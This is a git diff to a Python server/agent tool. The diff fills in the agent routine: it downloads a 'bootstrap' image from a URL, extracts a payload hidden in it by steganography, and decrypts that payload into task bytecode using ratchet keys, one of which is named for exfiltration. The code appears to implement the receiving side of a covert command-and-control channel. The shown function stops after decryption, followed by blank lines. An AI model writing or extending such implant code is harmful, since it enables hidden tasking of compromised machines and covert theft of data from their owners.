@@ -1,6 +1,10 @@
 import logging
 import os
 import argparse
+import requests
+
+from PIL import Image
+from io import BytesIO
 
 #Configure logging before importing project modules
 logging.basicConfig(
@@ -53,12 +57,12 @@ agent_group.add_argument("--watch", action="store_true", help="Poll server walle
 shared_state = {}
 
 def run_server(args):
-    #Load keys from keyfile
+    #Load server keys from keyfile
     K_root = server_load_server_keys(args.keyfile)
-    all_keys = server_derive_allkeys(K_root)
+    server_keys = server_derive_allkeys(K_root)
 
-    K_ratchet = all_keys["K_ratchet"]
-    K_extract = all_keys["K_extract"]
+    K_ratchet = server_keys["K_ratchet"]
+    K_extract = server_keys["K_extract"]
 
     #Splits args.task into valid bytecode instructions
     task_string = args.task
@@ -120,7 +124,73 @@ def run_server(args):
     shared_state["K_ratchet"] = K_ratchet
 
 def run_agent(args):
-    print("TEMP")
+    #Load agent keys from keyfile
+    agent_keys = agent_load_agent_keys(args.keyfile)
+
+    K_ratchet = agent_keys["K_ratchet"]
+    K_exfil_ratchet = agent_keys["K_exfil_ratchet"]
+    K_Extract = agent_keys["K_extract"]
+
+    #Download the bootstrap image
+    logger.info("Step A, Bootstrap image download start")
+
+    if args.mock:
+        image_bytes = shared_state["mock"].download_image(shared_state["txid"]) 
+        logger.info("Step A, Bootstrap image download Finished")
+    else:
+        image_bytes = requests.get(args.bootstrap_url, timeout=30).content
+        logger.info("Step A, Bootstrap image download Finished")
+
+    #Save downloaded bytes to a temp file
+    logger.info("Step B, Bootstrap image stego extraction start")
+
+    stego_stream = BytesIO(image_bytes)
+    stego_image = Image.open(stego_stream)
+
+    stego_dir = "src/temp"
+    os.makedirs(stego_dir, exist_ok=True)
+    stego_path = os.path.join(stego_dir, "stego.png")
+    stego_image.save(stego_path)
+
+    logger.info(f"Step B, Bootstap image saved to {stego_path}")
+
+    #Extract the payload from the bootstrap image
+    payload = extract(stego_path, K_Extract)
+    logger.info(f"Step B, Bootstap image payload extracted")
+    logger.info(f"Step B, Payload length {len(payload)}")
+    logger.info("Step B, Bootstrap image stego extraction finished")
+
+    #Decrypt the payload
+    logger.info("Step C, Payload decryption start")
+    payload_result = decrypt_task(payload, K_ratchet)
+
+    if payload_result is None:
+        logger.info("Step C, Payload decryption failed")
+        logger.info("Step C, Payload decryption finished")
+        return -1
+    
+    bytecode, agent_new_ratchet = payload_result
+    logger.info("Step C, Payload decryption succesful")
+    logger.info("Step C, Payload decryption finished")
+
+    
+
+
+
+
+
+
+    
+
+    
+
+    
+
+
+
+
+
+
 
 #Parses args and dispatches
 if __name__ == "__main__":
